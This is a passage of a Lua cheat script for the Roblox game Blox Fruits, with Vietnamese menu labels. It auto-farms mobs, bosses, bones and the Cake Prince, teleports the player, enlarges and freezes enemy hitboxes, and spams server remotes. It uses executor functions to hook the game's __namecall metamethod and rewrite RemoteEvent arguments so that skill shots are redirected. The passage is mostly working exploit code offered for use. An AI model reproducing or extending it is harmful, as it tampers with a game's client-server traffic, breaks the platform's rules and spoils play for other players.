                        if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                            repeat game:GetService("RunService").Heartbeat:wait()
                                EquipToolGun()
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                PositionSkillMasteryGun = v.HumanoidRootPart.Position
                                if SkillZ then
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "Z", false, game)
                                    wait()
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "Z", false, game)
                                end
                                if SkillX then
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "X", false, game)
                                    wait()
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "X", false, game)
                                end
                                if SkillC then
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "C", false, game)
                                    wait()
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "C", false, game)
                                end
                                if SkillV then
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "V", false, game)
                                    wait()
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "V", false, game)
                                end
                                if SkillF then
                                    game:GetService("VirtualInputManager"):SendKeyEvent(true, "F", false, game)
                                    wait()
                                    game:GetService("VirtualInputManager"):SendKeyEvent(false, "F", false, game)
                                end
                            until not AutoFarmMasGun or not _G.UseSkillGun or v.Humanoid.Health == 0
                        end
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasGun and TypeMastery == 'Near Mob' then
            pcall(function()
                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Name and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v:FindFirstChild("HumanoidRootPart").Position).Magnitude <= 1000000000 then
                            repeat wait(_G.Fast_Delay)
                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                    _G.UseSkillGun = true
                                else
                                    _G.UseSkillGun = false
                                    Click()


AutoHaki()
                                    bringmob = true
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame * Pos)
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency = 1
                                    v.Humanoid.JumpPower = 0
                                    v.Humanoid.WalkSpeed = 0
                                    v.HumanoidRootPart.CanCollide = false
                                    FarmPos = v.HumanoidRootPart.CFrame
                                    MonFarm = v.Name
                                    
                                end
                            until not AutoFarmMasGun or not MasteryType == 'Near Mob' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Near Mob'
                            bringmob = false
                            _G.UseSkillGun = false
                        end
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasGun and TypeMastery == 'Ecto' then
            pcall(function()
                local EctoMob = CFrame.new(904.4072265625, 181.05767822266, 33341.38671875)
                Tween(EctoMob)
            end)
            local Distance = (Vector3.new(904.4072265625, 181.05767822266, 33341.38671875) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 20000 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == "Ship Steward" or v.Name == "Ship Engineer" or v.Name == "Ship Deckhand" or v.Name == "Ship Officer" then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkillGun = true
                            else
                                _G.UseSkillGun = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasGun or not MasteryType == 'Ecto' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Ecto'
                        bringmob = false
                        _G.UseSkillGun = false
                    end
                end
            end
            for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                if v.Name == "Ship Steward" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Ship Engineer" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Ship Deckhand" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Ship Officer" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasGun and TypeMastery == 'Cake' then
            pcall(function()
                local cakepos = CFrame.new(-1579.9111328125, 329.7358703613281, -12310.365234375)
                Tween(cakepos)
            end)
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker" then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkillGun = true
                            else
                                _G.UseSkillGun = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasGun or not MasteryType == 'Cake' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Cake'
                        bringmob = false
                        _G.UseSkillGun = false
                    end
                end
            end
            for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                if v.Name == "Cookie Crafter" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Cake Guard" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Baking Staff" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Head Baker" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasGun and TypeMastery == 'Level' then
            pcall(function()
                CheckLevel()
                if not string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                    Tween(CFrameQ)
                end
                if (CFrameQ.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1000000000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", NameQuest, QuestLv)
                end
            end)
            if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
                if game:GetService("Workspace").Enemies:FindFirstChild(Ms) then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                            if v.Name == Ms then
                                repeat wait(_G.Fast_Delay)
                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                        _G.UseSkillGun = true
                                    else
                                        _G.UseSkillGun = false
                                        Click()


AutoHaki()
                                        bringmob = true
                                        EquipWeapon(SelectWeapon)
                                        Tween(v.HumanoidRootPart.CFrame * Pos)
                                        v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.Humanoid.JumpPower = 0
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.CanCollide = false
                                        FarmPos = v.HumanoidRootPart.CFrame
                                        MonFarm = v.Name
                                        
                                    end
                                until not AutoFarmMasGun or not MasteryType == 'Level' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Level'
                                bringmob = false
                                _G.UseSkillGun = false
                            end
                        end
                    end
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasGun and TypeMastery == 'Level No Quest' then
            pcall(function()
                CheckLevel()
                Tween(CFrameQ)
            end)
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == Ms then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkillGun = true
                            else
                                _G.UseSkillGun = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasGun or not MasteryType == 'Level No Quest' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Level No Quest'
                        bringmob = false
                        _G.UseSkillGun = false
                    end
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasGun and TypeMastery == 'Bone' then
            pcall(function()
                local boneframe = CFrame.new(-9508.5673828125, 142.1398468017578, 5737.3603515625)
                Tween(boneframe)
            end)
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkillGun = true
                            else
                                _G.UseSkillGun = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasGun or not MasteryType == 'Bone' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Bone'
                        bringmob = false
                        _G.UseSkillGun = false
                    end
                end
            end
            for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                if v.Name == "Reborn Skeleton" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Living Zombie" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Demonic Soul" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Posessed Mummy" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                end
            end
        end
    end
end)
function EquipToolGun()
    pcall(function()
        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.ToolTip == "Gun" and v:IsA('Tool') then
                local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name)
                game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(ToolHumanoid)
            end
        end
    end)
end
spawn(function()
    local gg = getrawmetatable(game)
    local old = gg.__namecall
    setreadonly(gg, false)
    gg.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = { ... }
        if tostring(method) == "FireServer" then
            if tostring(args[1]) == "RemoteEvent" then
                if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                    if _G.UseSkillGun then
                        if type(args[2]) == "vector" then
                            args[2] = PositionSkillMasteryGun
                        else
                            args[2] = CFrame.new(PositionSkillMasteryGun)
                        end
                        return old(unpack(args))
                    end
                    if _G.UseSkill then
                        if type(args[2]) == "vector" then
                            args[2] = PositionSkillMasteryDevilFruit
                        else
                            args[2] = CFrame.new(PositionSkillMasteryDevilFruit)
                        end
                        return old(unpack(args))
                    end
                end
            end
        end
        return old(...)
    end)
end)
if Sea3 then
local MiscFarm = Tabs.Main:AddSection("Xương")
local StatusBone = Tabs.Main:AddParagraph({
    Title="Xương Trạng Thái",
    Content=""
})
spawn(function()
    pcall(function()
        while wait() do
            local bones = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones", "Check")
            StatusBone:SetDesc("Mày Có: " .. tostring(bones) .. " Xương")
        end
    end)
end)
local ToggleBone = Tabs.Main:AddToggle("ToggleBone", {
    Title="Cày Xương",
    Description="", 
    Default=false })
ToggleBone:OnChanged(function(Value)
    _G.AutoBone=Value
    if Value==false then
        wait()
        Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
        wait()
    end
end)
Options.ToggleBone:SetValue(false)
local BoneCFrame = CFrame.new(-9517.65, 174.85, 6113.25)
spawn(function()
    while wait() do
        if _G.AutoBone then
            pcall(function()
                local QuestTitle = game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text
                if not string.find(QuestTitle, "Demonic Soul") then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                end
                if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==false then
                 Tween(BoneCFrame)
                if (BoneCFrame.Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then    
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest","HauntedQuest2",1)
                    end
                elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==true then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                    
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health>0 then
                                if v.Name=="Demonic Soul" or v.Name=="Posessed Mummy" then
                                
                                    if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Demonic Soul") then
                                        repeat wait(_G.Fast_Delay)
                                            
                                            Click()


AutoHaki()
                                            bringmob=true
                                            EquipWeapon(SelectWeapon)
                                            Tween(v.HumanoidRootPart.CFrame*Pos)
                                            v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                            v.HumanoidRootPart.Transparency=1
                                            v.Humanoid.JumpPower=0
                                            v.Humanoid.WalkSpeed=0
                                            v.HumanoidRootPart.CanCollide=false
                                            FarmPos=v.HumanoidRootPart.CFrame
                                            MonFarm=v.Name
                                        until not _G.AutoBone or v.Humanoid.Health<=0 or not v.Parent or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==false
                                    else
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                        bringmob=false
                                    end
                                end
                            end
                        end
                    else
                    end
                end
            end)
        end
    end
end)
local BoneNoQuest = CFrame.new(-9515.75, 174.8521728515625, 6079.40625)
spawn(function()
    while wait() do
        if _G.AutoBoneNoQuest then
            pcall(function()
                Tween(BoneNoQuest)
                if (BoneNoQuest.Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                end
                if game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy")  then
                
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health>0 then
                            if v.Name=="Demonic Soul" or v.Name=="Posessed Mummy" then
                            
                                repeat wait(_G.Fast_Delay)
                                    
                                    Click()


AutoHaki()
                                    bringmob=true
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency=1
                                    v.Humanoid.JumpPower=0
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.CanCollide=false
                                    FarmPos=v.HumanoidRootPart.CFrame
                                    MonFarm=v.Name
                                until not _G.AutoBoneNoQuest or v.Humanoid.Health<=0 or not v.Parent
                            end
                        end
                    end
                end
            end)
        end
    end
end)
Tabs.Main:AddButton({
    Title="Cầu Nguyện",
    Description="",
    Callback=function()
        local args = {
            [1]="gravestoneEvent",
            [2]=1
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
Tabs.Main:AddButton({
    Title="Thử Vận May",
    Description="",
    Callback=function()
        local args = {
            [1]="gravestoneEvent",
            [2]=2
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})
local ToggleRandomBone = Tabs.Main:AddToggle("ToggleRandomBone", {Title="Random Xương",Description="", Default=false })
ToggleRandomBone:OnChanged(function(Value)  
        _G.AutoRandomBone=Value
end)
Options.ToggleRandomBone:SetValue(false)
spawn(function()
    while wait() do
    if _G.AutoRandomBone then
    local args = {
     [1]="Bones",
     [2]="Buy",
     [3]=1,
     [4]=1
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
    end
    end)
end
if Sea3 then
local MiscFarm = Tabs.Main:AddSection("Tư Lệnh Bánh")
local Mob_Kill_Cake_Prince = Tabs.Main:AddParagraph({
    Title="Trạng Thái Nó Ra",
    Content=""
})
spawn(function()
    while wait() do
        pcall(function()
            if string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"))==88 then
                Mob_Kill_Cake_Prince:SetDesc("Còn: "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,41).."")
            elseif string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"))==87 then
                Mob_Kill_Cake_Prince:SetDesc("Còn: "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,40).."")
            elseif string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"))==86 then
                Mob_Kill_Cake_Prince:SetDesc("Còn: "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,39).." ")
            else
                Mob_Kill_Cake_Prince:SetDesc("Tư Lệnh Bánh : ✅️")
            end
        end)
    end
end)
local ToggleCake = Tabs.Main:AddToggle("ToggleCake", {
    Title = "Cày Tư Lệnh Bánh",
    Description = "", 
    Default = false
})
ToggleCake:OnChanged(function(Value)
    _G.Cake = Value
    if Value == false then
        wait()
        Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
        wait()
    end
end)
Options.ToggleCake:SetValue(false)
spawn(function()
    while wait() do
        if _G.Cake then
            pcall(function()
                if game.ReplicatedStorage:FindFirstChild("Cake Prince") or game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") or game.ReplicatedStorage:FindFirstChild("Dough King") or game:GetService("Workspace").Enemies:FindFirstChild("Dough King") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") or game:GetService("Workspace").Enemies:FindFirstChild("Dough King") then
                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Cake Prince" or v.Name == "Dough King" then
                                repeat
                                    wait(_G.Fast_Delay)  
                                    Click()


AutoHaki()  
                                    EquipWeapon(SelectWeapon)  
                                    v.HumanoidRootPart.CanCollide = false  
                                    v.Humanoid.WalkSpeed = 0  
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)  
                                    Tween(v.HumanoidRootPart.CFrame * Pos)  
                                      
                                until _G.Cake == false or not v.Parent or v.Humanoid.Health <= 0
                            end    
                        end    
                    else
                        Tween(CFrame.new(-2009.2802734375, 4532.97216796875, -14937.3076171875)) 
                    end
                else
                    if game.Workspace.Enemies:FindFirstChild("Baking Staff") or game.Workspace.Enemies:FindFirstChild("Head Baker") or game.Workspace.Enemies:FindFirstChild("Cake Guard") or game.Workspace.Enemies:FindFirstChild("Cookie Crafter") then
                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if (v.Name == "Baking Staff" or v.Name == "Head Baker" or v.Name == "Cake Guard" or v.Name == "Cookie Crafter") and v.Humanoid.Health > 0 then
                                repeat
                                    wait(_G.Fast_Delay)  
                                    Click()


AutoHaki()  
                                    EquipWeapon(SelectWeapon)  
                                    bringmob = true  
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)  
                                    POSCAKE = v.HumanoidRootPart.CFrame  
                                    Tween(v.HumanoidRootPart.CFrame * Pos)  
                                      
                                until _G.Cake == false or game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince") or game:GetService("ReplicatedStorage"):FindFirstChild("Dough King") or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    else
                        bringmob = false
                        Tween(CFrame.new(-1579.9111328125, 329.7358703613281, -12310.365234375)) 
                    end
                end
            end)
        end
    end
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Cake and bringmob and (v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker") and (v.HumanoidRootPart.Position - POSCAKE.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = POSCAKE
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.Cake then
            pcall(function()
                if game.ReplicatedStorage:FindFirstChild("Cake Prince") or game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") or game.ReplicatedStorage:FindFirstChild("Dough King") or game:GetService("Workspace").Enemies:FindFirstChild("Dough King") then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") or game:GetService("Workspace").Enemies:FindFirstChild("Dough King") then
                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Cake Prince" or v.Name == "Dough King" then
                                repeat
                                    wait(_G.Fast_Delay)  
                                    Click()


AutoHaki()  
                                    EquipWeapon(SelectWeapon)  
                                    v.HumanoidRootPart.CanCollide = false  
                                    v.Humanoid.WalkSpeed = 0  
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)  
                                    Tween(v.HumanoidRootPart.CFrame * Pos)  
                                      
                                until _G.Cake == false or not v.Parent or v.Humanoid.Health <= 0
                            end    
                        end    
                    else
                        Tween(CFrame.new(-2009.2802734375, 4532.97216796875, -14937.3076171875)) 
                    end
                else
                    if game.Workspace.Enemies:FindFirstChild("Baking Staff") or game.Workspace.Enemies:FindFirstChild("Head Baker") or game.Workspace.Enemies:FindFirstChild("Cake Guard") or game.Workspace.Enemies:FindFirstChild("Cookie Crafter") then
                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if (v.Name == "Baking Staff" or v.Name == "Head Baker" or v.Name == "Cake Guard" or v.Name == "Cookie Crafter") and v.Humanoid.Health > 0 then
                                repeat
                                    wait(_G.Fast_Delay)  
                                    Click()


AutoHaki()  
                                    EquipWeapon(SelectWeapon)  
                                    bringmob = true  
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)  
                                    POSCAKE = v.HumanoidRootPart.CFrame  
                                    Tween(v.HumanoidRootPart.CFrame * Pos)  
                                      
                                until _G.Cake == false or game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince") or game:GetService("ReplicatedStorage"):FindFirstChild("Dough King") or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    else
                        bringmob = false
                        Tween(CFrame.new(-1579.9111328125, 329.7358703613281, -12310.365234375)) 
                    end
                end
            end)
        end
    end
end)
    local ToggleSpawnCake = Tabs.Main:AddToggle("ToggleSpawnCake", {
        Title="Triệu Hồi Tư Lệnh Bánh",
        Description="", 
        Default=true })
    ToggleSpawnCake:OnChanged(function(Value)
      _G.SpawnCakePrince=Value
    end)
    Options.ToggleSpawnCake:SetValue(true)
end
spawn(function()
  while wait() do
    if _G.SpawnCakePrince then
      local args = {
        [1]="CakePrinceSpawner",
        [2]=true
      }
      game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))                    
      local args = {
        [1]="CakePrinceSpawner"
      }
      game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
  end
end)
    if Sea2 then
    local MiscFarm = Tabs.Main:AddSection("Ectoplasm Farm")
    local ToggleVatChatKiDi = Tabs.Main:AddToggle("ToggleVatChatKiDi", {
        Title="Auto Farm Ectoplasm",
        Description="", 
        Default=false })
    ToggleVatChatKiDi:OnChanged(function(Value)
        _G.Ectoplasm=Value
    end)
    Options.ToggleVatChatKiDi:SetValue(false)
    spawn(function()
        while wait() do
            pcall(function()
                if _G.Ectoplasm then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Ship Steward" or v.Name=="Ship Engineer" or v.Name=="Ship Deckhand" or v.Name=="Ship Officer" and v:FindFirstChild("Humanoid") then
                                if v.Humanoid.Health>0 then
                                    repeat wait(_G.Fast_Delay)
                                        
                                        Click()
                                        
                                        
                                        AutoHaki()
                                        bringmob=true
                                        EquipWeapon(SelectWeapon)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        v.HumanoidRootPart.Transparency=1
                                        v.Humanoid.JumpPower=0
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.CanCollide=false
                                        FarmPos=v.HumanoidRootPart.CFrame
                                        MonFarm=v.Name
                                    until _G.Ectoplasm==false or not v.Parent or v.Humanoid.Health==0 or not game:GetService("Workspace").Enemies:FindFirstChild(v.Name)
                                    bringmob=false
                                end
                            end
                        end
                    else
                        local Distance = (Vector3.new(904.4072265625, 181.05767822266, 33341.38671875)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                        if Distance>20000 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                        end
                        Tween(CFrame.new(904.4072265625, 181.05767822266, 33341.38671875))
                    end
                end
            end)
        end
    end)
end
local boss = Tabs.Main:AddSection("Trùm")
    if Sea1 then
        tableBoss={"The Gorilla King","Bobby","Yeti","Mob Leader","Vice Admiral","Warden","Chief Warden","Swan","Magma Admiral","Fishman Lord","Wysper","Thunder God","Cyborg","Saber Expert"}
    elseif Sea2 then
        tableBoss={"Diamond","Jeremy","Fajita","Don Swan","Smoke Admiral","Cursed Captain","Darkbeard","Order","Awakened Ice Admiral","Tide Keeper"}
    elseif Sea3 then
        tableBoss={"rip_indra True Form","Tyrant of the Skies","Stone","Hydra Leader","Kilo Admiral","Captain Elephant","Beautiful Pirate","Longma","Soul Reaper","Cake Queen"}
    end
    local DropdownBoss = Tabs.Main:AddDropdown("DropdownBoss", {
        Title="Chọn Trùm",
        Description="",
        Values=tableBoss,
        Multi=false,
        Default=1,
    })
    DropdownBoss:SetValue(_G.SelectBoss)
    DropdownBoss:OnChanged(function(Value)
        _G.SelectBoss=Value
    end)
    local ToggleAutoFarmBoss = Tabs.Main:AddToggle("ToggleAutoFarmBoss", {
        Title="Đấm Trùm",
        Description="", 
        Default=false })
    ToggleAutoFarmBoss:OnChanged(function(Value)
        _G.AutoBoss=Value
    end)
    Options.ToggleAutoFarmBoss:SetValue(false)
    spawn(function()
        while wait() do
            if _G.AutoBoss then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild(_G.SelectBoss) then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name==_G.SelectBoss then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                    repeat wait(_G.Fast_Delay)
                                        
                                        Click()
                                        
                                        
                                        AutoHaki()
                                        EquipWeapon(SelectWeapon)
                                        v.HumanoidRootPart.CanCollide=false
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.Size=Vector3.new(60,60,60)                             
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
